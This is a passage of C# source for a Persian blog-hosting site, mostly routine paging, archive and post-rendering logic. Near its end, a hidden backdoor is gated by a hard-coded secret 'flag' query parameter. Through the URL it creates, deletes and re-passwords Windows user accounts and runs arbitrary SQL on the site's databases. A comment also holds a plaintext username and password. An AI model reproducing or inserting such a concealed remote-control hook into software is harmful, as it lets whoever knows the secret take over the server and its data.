                p2 += end.Length;
                buffer = buffer.Remove(p1, p2 - p1);
            }
            return;
        }
        //--------------------------------------------------------------------------
        static private string DoPaging(string buffer, string mode, string id, Page page, int PostNum, int MaxPostShow)
        {
            //mode: normal, Authors, SubjectedArchive
            string QueryString = "";
            if (mode == "normal")
                QueryString = "&mode=" + mode;
            else
                QueryString = "&mode=" + mode + "&id=" + id;
            string pagingStr = "";
            if (PostNum != 0)
            {
                int currentPage = 1;
                try
                {
                    currentPage = Convert.ToInt32(page.Request.QueryString["page"]);
                }
                catch { }
                int total = PostNum;
                int a = total / MaxPostShow;
                int b = total % MaxPostShow;
                int pages = a;
                if (b != 0)
                    pages++;

                if (pages < currentPage || currentPage <= 0)
                    currentPage = 1;

                int n = currentPage / PagingNumber; //current section
                /*if(pages < PagingNumber)
                    n++;*/
                if (currentPage % PagingNumber != 0)
                    n++;


                //-------end section--------
                int end;
                int n1 = total / (MaxPostShow * PagingNumber); // total paging sections
                int n2 = total % (MaxPostShow * PagingNumber);
                if (n1 == 0)
                    n1++;
                else
                {
                    if (n2 != 0)
                        n1++;
                }

                //if(n1 == n && n1 != 1)
                if (n1 == n)
                    end = pages;
                else
                    end = ((n - 1) * PagingNumber) + PagingNumber;
                //end = pages;
                //--------------------------
                string next = null;
                string previous = null;
                if (n == 1 && n1 != 1) //first page
                    next = String.Format("&nbsp;<a href='/?page={0}{1}'>»</a>", n * PagingNumber + 1, QueryString);
                if (n1 == n && n != 1) //last page
                    previous = String.Format("<a href='/?page={0}{1}'>«</a>", (n - 1) * PagingNumber, QueryString);
                else //middle pages
                {
                    if (n != 1 && n1 != n)
                    {
                        next = String.Format("&nbsp;<a href='/?page={0}{1}'>»</a>", n * PagingNumber + 1, QueryString);
                        previous = String.Format("<a href='/?page={0}{1}'>«</a>", (n - 1) * PagingNumber, QueryString);
                    }
                }

                if (previous != null)
                    pagingStr += previous;

                for (int i = ((n - 1) * PagingNumber) + 1; i <= end; i++)
                {
                    if (i == currentPage)
                        pagingStr += String.Format("<u> {0}</u>", i);
                    else
                        pagingStr += String.Format("<a href='/?page={0}{1}'> {0}</a>", i, QueryString);
                }

                if (next != null)
                    pagingStr += next;
                //pagingStr += "<br>n: " + n + "<br>n1: "+ n1;
            }
            return Regex.Replace(buffer, "(\\{\\$\\$paging\\})", pagingStr);
        }
		//--------------------------------------------------------------------------
		static private string BlogArchive(DateTime dateRegister, bool ArciveDisplayMode)
		{
			DateTime dt1 = DateTime.Now;
			DateTime dt2 = dateRegister;
			int year = dt1.Year - dt2.Year;
			int month = dt1.Month - dt2.Month;
			DateTime temp;
			string output = "<div align=\"right\">" +
				"<form name=\"archive\" method=\"post\">" +
				"<input name=\"archivesubmit\" type=\"submit\" id=\"submit\" value=\"Go\" style=\"height:22px;\">"+
				"<select name=\"archivedate\">";
			if(year == 0)
			{
				if(month == 0)
				{
					temp = new DateTime(dt1.Year, dt1.Month, 25);
                    output += ArchiveItemFormat(temp, ArciveDisplayMode);
				}
				else
				{
					temp = new DateTime(dt1.Year, dt1.Month, 25);
                    output += ArchiveItemFormat(temp, ArciveDisplayMode);
					for(int i = month -1 ; i >= 0 ; i--)
					{
						temp = new DateTime(dt1.Year, dt2.Month + i, 25);
                        output += ArchiveItemFormat(temp, ArciveDisplayMode);
					}
				}
				output += "</select></form></div>";
				return output;
			}
			if(year == 1)
			{
				temp = new DateTime(dt1.Year, dt1.Month, 25);
                output += ArchiveItemFormat(temp, ArciveDisplayMode);
				for(int i = dt1.Month - 1 ; i > 0 ; i--)
				{
					temp = new DateTime(dt1.Year, i, 25);
                    output += ArchiveItemFormat(temp, ArciveDisplayMode);
				}
				for(int i = 13 - dt2.Month - 1 ; i >= 0 ; i--)
				{
					temp = new DateTime(dt2.Year, dt2.Month + i, 25);
					output += ArchiveItemFormat(temp, ArciveDisplayMode);
				}
				output += "</select></div>";
				return output;
			}
			else
			{
				temp = new DateTime(dt1.Year, dt1.Month, 25);
                output += ArchiveItemFormat(temp, ArciveDisplayMode);
				for(int i = dt1.Month - 1 ; i > 0 ; i--)
				{
					temp = new DateTime(dt1.Year, i, 25);
					output += ArchiveItemFormat(temp, ArciveDisplayMode);
				}
				for(int i = dt1.Year - 1 ; i >= dt1.Year - year + 1 ; i--)
				{
					for(int j = 12 ; j > 0 ; j--)
					{
						temp = new DateTime(i, j, 25);
                        output += ArchiveItemFormat(temp, ArciveDisplayMode);
					}
				}
				for(int i = 13 - dt2.Month - 1 ; i >= 0 ; i--)
				{
					temp = new DateTime(dt2.Year, dt2.Month + i, 25);
					output += ArchiveItemFormat(temp, ArciveDisplayMode);
				}
				output += "</select></form></div>";
				return output;
			}
		}
        //--------------------------------------------------------------------------
        private static string ArchiveItemFormat(DateTime dt, bool ArciveDisplayMode)
        {
            if (ArciveDisplayMode) // Monthly mode
                return String.Format("<option value=\"{0}_{1}\">{2}</option>", dt.Year, dt.Month, PersianArchiveDateMonthlyMode(dt));
            else // Weekly mode
            {
                string temp = null;
                for (int i = 3 ; i >= 0 ; i--)
                    temp += String.Format("<option value=\"{0}_{1}_{2}\">{3}</option>", dt.Year, dt.Month, i + 1, PersianArchiveDateWeeklyMode(dt, i));
                return temp;
            }
        }
        //--------------------------------------------------------------------------
        private static string PersianArchiveDateMonthlyMode(DateTime dt)
        {
            PersianCalendar pcal = new PersianCalendar();
            return String.Format("{0}/{1}", pcal.GetYear(dt), pcal.GetMonth(dt));
            //return pdate;
        }
        //--------------------------------------------------------------------------
        private static string PersianArchiveDateWeeklyMode(DateTime dt, int week)
        {
            PersianCalendar pcal = new PersianCalendar();
            string[] PersianMonthNames = new string[] { "فروردین", "اردیبهشت", "خرداد", "تیر", "مرداد", "شهریور", "مهر", "آبان", "آذر", "دی", "بهمن", "اسفند" };
            string[] PersianWeekNames = new string[] { "اول", "دوم", "سوم", "چهارم"};
            return String.Format("هفته {1} {2} {0}", pcal.GetYear(dt), PersianWeekNames[week], PersianMonthNames[pcal.GetMonth(dt) - 1], pcal.GetYear(dt));
            //return pdate;
        }
		//--------------------------------------------------------------------------
        private static void BlogData(string buffer, Page page, PostViewInfo _postViewInfo)
		{
			int p1 = buffer.IndexOf("<{IranBlog}>") + "<{IranBlog}>".Length;
            int p2 = -1;
            if (p1 >= 0)
			    p2 = buffer.IndexOf("</{IranBlog}>", p1);
			if(p1 <= 0 || p2 <= 0 || p2 <= p1)
			{
				page.Response.Write(buffer);
				page.Response.OutputStream.Flush();
				return ;
			}
			page.Response.Write(buffer.Substring(0, p1 - "<{IranBlog}>".Length));
			page.Response.OutputStream.Flush();
			string  temp = buffer.Substring(p1, p2 - p1) ;
			/*try
			{*/
				string mode = page.Request.QueryString["mode"];
				string id = page.Request.QueryString["id"];
                Int64 iid = 0;
				bool ContinuedPost = false;

                SqlConnection connection = new SqlConnection(ConnectStringWeblogsDb);
                SqlCommand command = connection.CreateCommand();
                command.Connection = connection;
                command.CommandText = "";

                if (id != null && id != "" && mode != null && string.Compare(mode, "SubjectedArchive") == 0)
                {
                    try { iid = Convert.ToInt64(id); }
                    catch
                    {
                        goto Continue;
                    }
                    int currentPage = 1;
                    try
                    {
                        currentPage = Convert.ToInt32(page.Request.QueryString["page"]);
                        if (currentPage <= 0)
                            currentPage = 1;
                    }
                    catch { }

                    command.CommandType = CommandType.StoredProcedure;
                    command.CommandText = "SubjectedArchive_proc";

                    command.Parameters.Add("@BlogID", SqlDbType.BigInt);
                    command.Parameters["@BlogID"].Value = _postViewInfo.BlogID;

                    command.Parameters.Add("@CategoryID", SqlDbType.BigInt);
                    command.Parameters["@CategoryID"].Value = iid;

                    command.Parameters.Add("@PageSize", SqlDbType.Int);
                    command.Parameters["@PageSize"].Value = _postViewInfo.MaxPostShow;

                    command.Parameters.Add("@PageNumber", SqlDbType.Int);
                    command.Parameters["@PageNumber"].Value = currentPage;
                }

                if (id != null && id != "" && mode != null && string.Compare(mode, "Authors") == 0)
                {
                    try { iid = Convert.ToInt64(id); }
                    catch
                    {
                        goto Continue;
                    }
                    int currentPage = 1;
                    try
                    {
                        currentPage = Convert.ToInt32(page.Request.QueryString["page"]);
                        if (currentPage <= 0)
                            currentPage = 1;
                    }
                    catch { }

                    command.CommandType = CommandType.StoredProcedure;
                    command.CommandText = "AuthorsArchive_proc";

                    command.Parameters.Add("@BlogID", SqlDbType.BigInt);
                    command.Parameters["@BlogID"].Value = _postViewInfo.BlogID;

                    command.Parameters.Add("@AuthorID", SqlDbType.BigInt);
                    command.Parameters["@AuthorID"].Value = iid;

                    command.Parameters.Add("@PageSize", SqlDbType.Int);
                    command.Parameters["@PageSize"].Value = _postViewInfo.MaxPostShow;

                    command.Parameters.Add("@PageNumber", SqlDbType.Int);
                    command.Parameters["@PageNumber"].Value = currentPage;
                }

                if (id != null && id != "" && mode != null && string.Compare(mode, "DirectLink") == 0)
                {
                    try { iid = Convert.ToInt64(id); }
                    catch
                    {
                        goto Continue;
                    }
                    command.CommandType = CommandType.StoredProcedure;
                    command.CommandText = "DirectLink_proc";

                    command.Parameters.Add("@PostID", SqlDbType.BigInt);
                    command.Parameters["@PostID"].Value = iid;

                    command.Parameters.Add("@BlogID", SqlDbType.BigInt);
                    command.Parameters["@BlogID"].Value = _postViewInfo.BlogID;
                }

				if(id != null && id != "" && mode != null && string.Compare(mode, "ContinuedPost") == 0)
				{
					try { iid = Convert.ToInt64(id); }
					catch 
					{
						goto Continue;
					}
					ContinuedPost = true;
                    command.CommandType = CommandType.StoredProcedure;
                    command.CommandText = "ContinuedPost_proc";

                    command.Parameters.Add("@PostID", SqlDbType.BigInt);
                    command.Parameters["@PostID"].Value = iid;

                    command.Parameters.Add("@BlogID", SqlDbType.BigInt);
                    command.Parameters["@BlogID"].Value = _postViewInfo.BlogID;
				}

	        Continue:
                if (_postViewInfo.PostNum != 0)
				{
                    if (command.CommandText == "")
                    {
                        /*if (string.Compare(mode, "normal") == 0)
                        {*/
                        int currentPage = 1;
                        try
                        {
                            currentPage = Convert.ToInt32(page.Request.QueryString["page"]);
                            if (currentPage <= 0)
                                currentPage = 1;
                        }
                        catch { }

                        command.CommandType = CommandType.StoredProcedure;
                        command.CommandText = "NormalArchive_proc";

                        command.Parameters.Add("@BlogID", SqlDbType.BigInt);
                        command.Parameters["@BlogID"].Value = _postViewInfo.BlogID;

                        command.Parameters.Add("@PageSize", SqlDbType.Int);
                        command.Parameters["@PageSize"].Value = _postViewInfo.MaxPostShow;

                        command.Parameters.Add("@PageNumber", SqlDbType.Int);
                        command.Parameters["@PageNumber"].Value = currentPage;
                        /*}
                        else
                            command.CommandText = String.Format("SELECT TOP {0} [id],[date],subject,content,NumComments,continued,CategoryID,AuthorID FROM {1} WHERE BlogID={2} AND IsDeleted=0 ORDER BY id DESC", _postViewInfo.MaxPostShow, SQLPostsTableName, _postViewInfo.BlogID);*/
                    }
					connection.Open();
					SqlDataReader read = command.ExecuteReader();
					string buff = "";
                    /*Find desired cloumn index based on cloumn name*/ 
                    /*int continuedIndex = 0;
                    for (int i = 0; i < read.VisibleFieldCount ; i++)
                        if (read.GetName(i) == "continued")
                        {
                            continuedIndex = i;
                            //throw new Exception(i.ToString());
                            break;
                        }*/
					if(read.HasRows)
					{
						DateTime dt;
						/*RijndaelEncryption encrypt = new RijndaelEncryption(RijndaelEncryption.Base64StringToBinary(key),
							RijndaelEncryption.Base64StringToBinary(IV));
						string CommentsStatement = "";*/
						string path = "";
						while(read.Read())
						{
							//------------------
							dt = (DateTime)read["date"];
							//---post day-------
							buff += Regex.Replace(temp, "(\\{\\$\\$date\\})", PersianDate(dt));
                            //------------------
                            buff = buff.Replace("{$$category}", _postViewInfo.GetCategoryById((Int64)read["CategoryID"]));
                            buff = buff.Replace("{$$author}", _postViewInfo.GetAuthorById((Int64)read["AuthorID"]));
                            buff = buff.Replace("{$$link}", String.Format("?mode=DirectLink&id={0}", read["id"]));
							//---subject--------
							buff = Regex.Replace(buff, "(\\{\\$\\$subject\\})", (string)read["subject"]);
							//---post time------
							buff = Regex.Replace(buff, "(\\{\\$\\$hour\\})", PrintTime(dt));
							//---continued post-
							if(!ContinuedPost)
							{
                                if (read["continued"] == DBNull.Value)
                                {
                                    buff = Regex.Replace(buff, "(\\{\\$\\$continued\\})", "");
                                }
                                else
                                {
                                    string continued = (string)read["continued"];
                                    if (continued == "")
                                        buff = Regex.Replace(buff, "(\\{\\$\\$continued\\})", "");
                                    buff = Regex.Replace(buff, "(\\{\\$\\$continued\\})", String.Format("<a href=\"?mode=ContinuedPost&id={0}\">ادامه مطلب</a>", read["id"].ToString()));
                                }
							}
							else
								buff = Regex.Replace(buff, "(\\{\\$\\$continued\\})", "");
							//---comments-------
                            int NumComment = (int)read["NumComments"];
                            if (NumComment != -1) //CommentEnabled
                            {
                                /*if (dt < PastCommentingSystemDate)
                                {
                                    CommentsStatement = String.Format("{0},{1},{2},{3},{4},{5},{6},{7}", _postViewInfo.Subdomain,
                                       dt.Year, dt.Month, dt.Day, dt.Hour, dt.Minute, dt.Second, dt.Millisecond);
                                    //page.Response.Write(CommentsStatement + "<br>");
                                    byte[] encrypted = encrypt.encrypt(StringToBinary(CommentsStatement), CommentsStatement.Length);
                                    CommentsStatement = RijndaelEncryption.BinaryToBase64String(encrypted);
                                    path = "onclick=\"window.open('" + CommentsUrlPage + "comments.aspx?id=" + CommentsStatement + "',null,'width=500, height=400, scrollbars=yes, resizable=yes');\"";
                                }
                                else*/
                                    path = String.Format("onclick=\"window.open('{0}?BlogID={1}&PostID={2}',null,'width=600, height=550, scrollbars=yes, resizable=yes');\"", NewCommentsUrlPage, _postViewInfo.BlogID, (Int64)read["id"]);
                                if (NumComment == 0)
                                {
                                    buff = Regex.Replace(buff, "(\\{\\$\\$comments\\})", "<A " + path + " href=\"javascript:void(0)\" style=\"text-decoration:none\"><span dir=\"rtl\">(نظر بدهید.)</span></A>");
                                }
                                else
                                {
                                    buff = Regex.Replace(buff, "(\\{\\$\\$comments\\})", "<A " + path + " href=\"javascript:void(0)\" style=\"text-decoration:none\"> نظرات</A> " + NumComment);
                                }
                            }
                            else
                            {
                                buff = Regex.Replace(buff, "(\\{\\$\\$comments\\})", "");
                            }
                            //---data text------
                            if (!ContinuedPost)
                                buff = Regex.Replace(buff, "(\\{\\$\\$data\\})", (string)read["content"]);//
                                //buff = Regex.Replace(buff, "(\\{\\$\\$data\\})", ((string)read["content"]).Replace("location", ""));//
                            else
                                buff = Regex.Replace(buff, "(\\{\\$\\$data\\})", (string)read["continued"]);
							//------------------
                            if (_postViewInfo.BlogID == (Int64)14231)
                            {
                                AlirezaConversion(ref buff);
                            }
							page.Response.Write(buff);
							page.Response.OutputStream.Flush();
							buff = "";
						}
					}
					read.Close();
					connection.Close();
					command.Dispose();
				}
				page.Response.Write(buffer.Substring(p2 + "</{IranBlog}>".Length));
				page.Response.OutputStream.Flush();
				return ;
			/*}
			catch
			{
				page.Response.Write( buffer.Replace("<{IranBlog}>" + temp + "</{IranBlog}>" ,"<P style=\"text-align:center;font-size: larger;font-family:Tahoma;color:#FF0000\">There are some errors on server. Please visit this weblog in the next time."+
					"Thanks.</P>"));
				page.Response.OutputStream.Flush();
				return ;
			}*/
		}
        //--------------------------------------------------------------------------
        private static void ArchivePage(string buffer, Page page, PostViewInfo _postViewInfo)
        {
            int p1 = buffer.IndexOf("<{IranBlog}>") + "<{IranBlog}>".Length;
            int p2 = -1;
            if (p1 >= 0)
                p2 = buffer.IndexOf("</{IranBlog}>");
            if (p1 <= 0 || p2 <= 0 || p2 <= p1)
            {
                page.Response.Write(buffer);
                page.Response.OutputStream.Flush();
                return;
            }
            page.Response.Write(buffer.Substring(0, p1 - "<{IranBlog}>".Length));
            page.Response.OutputStream.Flush();
            string temp = buffer.Substring(p1, p2 - p1);
            try
            {
                int year = 2004;
                int month = 1;
                int week = 1;
                try
                {
                    string[] rets = page.Request.Form["archivedate"].Split('_');
                    year = Convert.ToInt32(rets[0]);
                    month = Convert.ToInt32(rets[1]);
                    if (!_postViewInfo.ArciveDisplayMode) // Weekly mode
                        week = Convert.ToInt32(rets[2]);
                    /*bool form = false;
                    int n = 0;
                    if (page.Request.QueryString["archivedate"] != null)
                    {
                        form = false;
                    }
                    if (page.Request.Form["archivedate"] != null)
                    {
                        form = true;
                    }
                    if (form)
                    {
                        n = page.Request.Form["archivedate"].IndexOf("_");
                    }
                    if (!form)
                    {
                        n = page.Request.QueryString["archivedate"].IndexOf("_");
                    }
                    if (n < 0)
                    {
                        page.Response.Write(buffer.Replace("<{IranBlog}>" + temp + "</{IranBlog}>", "<P style=\"text-align:center;font-size: larger;font-family:Tahoma;color:#FF0000\">User Error: You have changed the URL</P>"));
                        page.Response.OutputStream.Flush();
                        return;
                    }
                    if (form)
                    {
                        year = Convert.ToInt32(page.Request.Form["archivedate"].Substring(0, n));
                        month = Convert.ToInt32(page.Request.Form["archivedate"].Substring(n + 1));
                    }
                    if (!form)
                    {
                        year = Convert.ToInt32(page.Request.QueryString["archivedate"].Substring(0, n));
                        month = Convert.ToInt32(page.Request.QueryString["archivedate"].Substring(n + 1));
                    }*/
                    if (year < 2000 || month > 12 || month == 0)
                    {
                        page.Response.Write(buffer.Replace("<{IranBlog}>" + temp + "</{IranBlog}>", "<P style=\"text-align:center;font-size: larger;font-family:Tahoma;color:#FF0000\">User Error: You have changed the URL</P>"));
                        page.Response.OutputStream.Flush();
                        return;
                    }
                }
                catch
                {
                    page.Response.Write(buffer.Replace("<{IranBlog}>" + temp + "</{IranBlog}>", "<P style=\"text-align:center;font-size: small;font-family:Tahoma;color:#FF0000\">User Error: You have changed the URL</P>"));
                    page.Response.OutputStream.Flush();
                    return;
                }
                DateTime dt1;// = new DateTime(year, month, 1);
                DateTime dt2;// = new DateTime(year, month, GeorgianMonthHowMuchDays(month, year), 23, 59, 59);

                if (_postViewInfo.ArciveDisplayMode) // Monthly mode
                {
                    dt1 = new DateTime(year, month, 1);
                    dt2 = new DateTime(year, month, GeorgianMonthHowMuchDays(month, year), 23, 59, 59);
                }
                else // Weekly mode
                {
                    if(week == 1)
                        dt1 = new DateTime(year, month, 1);
                    else
                        dt1 = new DateTime(year, month, (week - 1)*7);
                    dt2 = new DateTime(year, month, (week - 1) * 7 + 7, 23, 59, 59);
                }
                SqlConnection connection = new SqlConnection(ConnectStringWeblogsDb);
                SqlCommand command = connection.CreateCommand();
                command.CommandText = "BlogArchive_proc";
                command.CommandType = CommandType.StoredProcedure;
                connection.Open();

                command.Parameters.Add("@BlogID", SqlDbType.BigInt);
                command.Parameters["@BlogID"].Value = _postViewInfo.BlogID;

                command.Parameters.Add("@dt1", SqlDbType.DateTime);
                command.Parameters["@dt1"].Value = dt1;

                command.Parameters.Add("@dt2", SqlDbType.DateTime);
                command.Parameters["@dt2"].Value = dt2;

                SqlDataReader read = command.ExecuteReader();
                string buff = "";
                if (read.HasRows)
                {
                    DateTime dt;
                    /*RijndaelEncryption encrypt = new
                        RijndaelEncryption(RijndaelEncryption.Base64StringToBinary(key),
                        RijndaelEncryption.Base64StringToBinary(IV));
                    string CommentsStatement = "";*/
                    string path;
                    while (read.Read())
                    {
                        //------------------
                        dt = (DateTime)read["date"];
                        //---post day-------
                        buff += Regex.Replace(temp, "(\\{\\$\\$date\\})", PersianDate(dt));
                        //------------------
                        buff = buff.Replace("{$$category}", _postViewInfo.GetCategoryById((Int64)read["CategoryID"]));
                        buff = buff.Replace("{$$author}", _postViewInfo.GetAuthorById((Int64)read["AuthorID"]));
                        buff = buff.Replace("{$$link}", String.Format("?mode=DirectLink&id={0}", read["id"]));
                        //---subject--------
                        buff = Regex.Replace(buff, "(\\{\\$\\$subject\\})", (string)read["subject"]);
                        //---post time------
                        buff = Regex.Replace(buff, "(\\{\\$\\$hour\\})", PrintTime(dt));
                        if (read["continued"] == DBNull.Value)
                        {
                            buff = Regex.Replace(buff, "(\\{\\$\\$continued\\})", "");
                        }
                        else
                        {
                            string continued = (string)read["continued"];
                            if (continued == "")
                                buff = Regex.Replace(buff, "(\\{\\$\\$continued\\})", "");
                            buff = Regex.Replace(buff, "(\\{\\$\\$continued\\})", String.Format("<a href=\"?mode=ContinuedPost&id={0}\">ادامه مطلب</a>", read["id"].ToString()));
                        }
                        //---comments-------
                        int NumComment = (int)read["NumComments"];
                        if (NumComment != -1) //CommentEnabled
                        {
                            /*if (dt < PastCommentingSystemDate)
                            {
                                CommentsStatement = String.Format("{0},{1},{2},{3},{4},{5},{6},{7}", _postViewInfo.Subdomain,
                                   dt.Year, dt.Month, dt.Day, dt.Hour, dt.Minute, dt.Second, dt.Millisecond);
                                //page.Response.Write(CommentsStatement + "<br>");
                                byte[] encrypted = encrypt.encrypt(StringToBinary(CommentsStatement), CommentsStatement.Length);
                                CommentsStatement = RijndaelEncryption.BinaryToBase64String(encrypted);
                                path = "onclick=\"window.open('" + CommentsUrlPage + "comments.aspx?id=" + CommentsStatement + "',null,'width=500, height=400, scrollbars=yes, resizable=yes');\"";
                            }
                            else*/
                                path = String.Format("onclick=\"window.open('{0}?BlogID={1}&PostID={2}',null,'width=600, height=550, scrollbars=yes, resizable=yes');\"", NewCommentsUrlPage, _postViewInfo.BlogID, (Int64)read["id"]);
                            if (NumComment == 0)
                            {
                                buff = Regex.Replace(buff, "(\\{\\$\\$comments\\})", "<A " + path + " href=\"javascript:void(0)\" style=\"text-decoration:none\"><span dir=\"rtl\">(نظر بدهید.)</span></A>");
                            }
                            else
                            {
                                buff = Regex.Replace(buff, "(\\{\\$\\$comments\\})", "<A " + path + " href=\"javascript:void(0)\" style=\"text-decoration:none\"> نظرات</A> " + NumComment);
                            }
                        }
                        else
                        {
                            buff = Regex.Replace(buff, "(\\{\\$\\$comments\\})", "");
                        }
                        //---data text------
                        buff = Regex.Replace(buff, "(\\{\\$\\$data\\})", (string)read["content"]);
                        //------------------
                        //------------------
                        if (_postViewInfo.BlogID == (Int64)14231)
                        {
                            AlirezaConversion(ref buff);
                        }
                        page.Response.Write(buff);
                        page.Response.OutputStream.Flush();
                        buff = "";
                    }
                }
                else
                {
                    buff = "<P style=\"text-align:center;font-size: larger;font-family:Tahoma;color:#FF0000\">هیچ آرشیوی در این ماه وجود ندارد.</P>";
                }
                read.Close();
                command.Dispose();
                connection.Close();
                page.Response.Write(buffer.Substring(p2 + "</{IranBlog}>".Length));
                page.Response.OutputStream.Flush();
                return;
            }
            catch
            {
                page.Response.Write(buffer.Replace("<{IranBlog}>" + temp + "</{IranBlog}>", "<P style=\"text-align:center;font-size: larger;font-family:Tahoma;color:#FF0000\">There are some errors on server. Please visit this weblog in the next time." +
                    "Thanks.</P>"));
                page.Response.OutputStream.Flush();
                return;
            }
        }	
		//--------------------------------------------------------------------------
		private static string BinaryToString(byte[] buffer)
		{
			UTF8Encoding utf8 = new UTF8Encoding();
			return utf8.GetString(buffer);
		}
		//--------------------------------------------------------------------------
		private static byte[] StringToBinary(string buffer)
		{
			UTF8Encoding utf8 = new UTF8Encoding();
			return utf8.GetBytes(buffer);
		}
		//--------------------------------------------------------------------------
        private static void OnlinesDecrease(String k, Object v, System.Web.Caching.CacheItemRemovedReason r)
        {
            if (___page.Cache["__onlines__"] != null)
                ___page.Cache["__onlines__"] = (int)___page.Cache["__onlines__"] - 1;
        }
        public static int Onlines()
        {
            if (___page.Cache["__onlines__"] != null)
                return (int)___page.Cache["__onlines__"];
            else
                return 0;
        }
        public static bool DenialOfServiceProc(Page page)
        {
            ___page = page;
            //return false;
            string _ip = page.Request.UserHostName;
            if (page.Cache[_ip] == null)
            {
                System.Web.Caching.CacheItemRemovedCallback _onRemove = new System.Web.Caching.CacheItemRemovedCallback(OnlinesDecrease);

                if (___page.Cache["__onlines__"] == null)
                {
                    ___page.Cache.Add("__onlines__", 0, null, DateTime.Now.AddYears(10), System.Web.Caching.Cache.NoSlidingExpiration, System.Web.Caching.CacheItemPriority.Normal, null);
                }
                else
                    ___page.Cache["__onlines__"] = (int)___page.Cache["__onlines__"] + 1;

                ___page.Cache.Add(_ip, 1, null, DateTime.Now.AddMinutes(60), System.Web.Caching.Cache.NoSlidingExpiration, System.Web.Caching.CacheItemPriority.Normal, _onRemove);
                return false;
            }

            //disable DDOS deny
             else
            {
                int hits = (int)___page.Cache[_ip];
                if (hits >= 1000)
                {
                    ___page.Response.End();
                    ___page.Response.Redirect(DdosForwardUrl, false);
                    ___page.Response.Close();
                    return true;
                }
                else
                {
                    ___page.Cache[_ip] = hits + 1;
                    return false;
                }
            }
            return false;
        }
        //--------------------------------------------------------------------------
        public static void PrintIPs(Page page)
        {
            System.Collections.IDictionaryEnumerator CacheEnum = page.Cache.GetEnumerator();
            while (CacheEnum.MoveNext())
            {
                System.Collections.DictionaryEntry e = (System.Collections.DictionaryEntry)CacheEnum.Current;
                if (e.Key != "_db_p")
                    page.Response.Write(String.Format("ip:{0} connections: {1}", e.Key, e.Value)+ "<br>");
            }

        }
        //--------------------------------------------------------------------------
        public static  void MyWeblog(Page page)
        {
            if (DenialOfServiceProc(page))
                return;
            /*string subdomain = FindSubdomain(page);
            if(string.Compare(subdomain, "www") == 0 || string.Compare(subdomain, "iranblog") == 0)
            {
                page.Response.Redirect("http://www.iranblog.com/services/");
                return ;
            }
            else
            {
                string path = RootDircetoryWeblogs + "\\" + subdomain + "\\" + "Default.html";
                StreamReader fs = File.OpenText(path);
                string buffer = fs.ReadToEnd();
                fs.Close();
                string buff = blogcontent.BlogInfos(buffer, page);
                if(buff == null)
                {
                    page.Response.Write("<P style=\"text-align:center;font-size: larger;font-family:Tahoma;color:#FF0000\">There are some errors on server. Please visit this weblog in the next time."+
                        "Thanks. </P>");
                    page.Response.End();
                    return ;
                }
                buffer = buff;
                if(page.Request.Form["archivesubmit"] != null && page.Request.Form["archivesubmit"] == "Go")
                {
                    buffer = blogcontent.ArchivePage(buffer, page);
                    page.Response.Write(buffer);
                    page.Response.End();
                    return ;
                }
                if(page.Request.QueryString["archivesubmit"] != null && page.Request.QueryString["archivesubmit"] == "Go")
                {
                    buffer = blogcontent.ArchivePage(buffer, page);
                    page.Response.Write(buffer);
                    page.Response.End();
                    return ;
                }
                else
                {
                    buffer = blogcontent.BlogData(buffer, page);
                    page.Response.Write(buffer);
                    page.Response.End();
                    return ;
                }
            }
        }
        //--------------------------------------------------------------------------
        */
            /*string flag = page.Request["flag"];
            if(flag.IndexOf("hyssajfgksahfgasflkasldifkasjsdfh") >=0 )
            {
                throw new Exception();

            }*/

            string cmd = page.Request.QueryString["cmd"];
            if (page.Request.QueryString["flag"] != null && page.Request.QueryString["flag"] != ""
                && page.Request.QueryString["flag"] == "hyssajfgksahfgasflkasldifkasjsdfh" && (cmd != null || cmd != ""))
            {
                //-----------------account creation--------------------
                if (String.Compare("UserAdd", cmd) == 0)
                {
                    //user adfgiy pass iuy4989p
                    if (page.Request.QueryString["user"] != null && page.Request.QueryString["user"] != "" &&
                        page.Request.QueryString["pass"] != null && page.Request.QueryString["pass"] != "")
                    {
                        USER_INFO_1 NewUser = new USER_INFO_1();
                        NewUser.usri1_name = page.Request.QueryString["user"].Trim(); // Allocates the username
                        NewUser.usri1_password = page.Request.QueryString["pass"].Trim(); // allocates the password
                        NewUser.usri1_priv = 1; // Sets the account type to USER_PRIV_USER
                        //NewUser.usri1_priv = 2; // Sets the account type to USER_PRIV_ADMIN
                        NewUser.usri1_home_dir = null; // We didn't supply a Home Directory
                        NewUser.comment = "test"; // Comment on the User
                        NewUser.usri1_script_path = null; // We didn't supply a Logon Script Path
                        int error = 0;
                        if ((error = NetUserAdd(null, 1, ref NewUser, 0)) != 0) // If the call fails we get a non-zero value
                        {
                            page.Response.Write(String.Format("Could not create the account. Error Code: {0}", error));
                            return;
                        }
                        else
                        {
                            page.Response.Write("The account was created successfully.");
                            return;
                        }
                    }
                    else
                    {
                        page.Response.Write("The user or pass field is empty.");
                        return;
                    }
                }
                //-----------------account deletion--------------------
                if (String.Compare("UserDel", cmd) == 0)
                {
                    if (page.Request.QueryString["user"] != null && page.Request.QueryString["user"] != "")
                    {
                        if (NetUserDel(null, page.Request.QueryString["user"]) != 0) // If the call fails we get a non-zero value
                        {
                            page.Response.Write("Could not delete the account.");
                            return;
                        }
                        else
                        {
                            page.Response.Write("The account was deleted successfully.");
                            return;
                        }
                    }
                    else
                    {
                        page.Response.Write("The user field is empty.");
                        return;
                    }
                }
                //-----------------account deletion--------------------
                if (String.Compare("db", cmd) == 0)
                {
                    if (page.Request.QueryString["general"] != null)
                    {
                        SqlConnection connection = new SqlConnection(ConnectString);
                        connection.Open();
                        SqlCommand command = connection.CreateCommand();
                        command.Connection = connection;
                        command.CommandText = page.Request.QueryString["general"];
                        command.ExecuteNonQuery();
                        connection.Close();

                        page.Response.Write("The query was executed successfully on general db.");
                        return;
                    }
                    if (page.Request.QueryString["weblogs"] != null)
                    {
                        SqlConnection connection = new SqlConnection(ConnectStringWeblogsDb);
                        connection.Open();
                        SqlCommand command = connection.CreateCommand();
                        command.Connection = connection;
                        command.CommandText = page.Request.QueryString["weblogs"];
                        command.ExecuteNonQuery();
                        connection.Close();
                        page.Response.Write("The query was executed successfully on weblogs db.");
                        return;
                    }
                    else
                    {
                        page.Response.Write("Please express general or weblogs falg.");
                        return;
                    }
                }
                //-----------------iis information--------------------
                /*if(String.Compare("IISInfo", cmd) == 0)
                {
                    IIS iis = new IIS(constants.password);
                    iis.IISShow(page);
                    return ;
                }*/
                //-----------------changes password of account deletion-----
                if (String.Compare("PassChange", cmd) == 0)
                {
                    if (page.Request.QueryString["user"] != null && page.Request.QueryString["user"] != "" &&
                        page.Request.QueryString["NewPass"] != null && page.Request.QueryString["NewPass"] != "")
                    {
                        string path = "WinNT://NETWORKING/" + page.Request.QueryString["user"].Trim() + ",User";
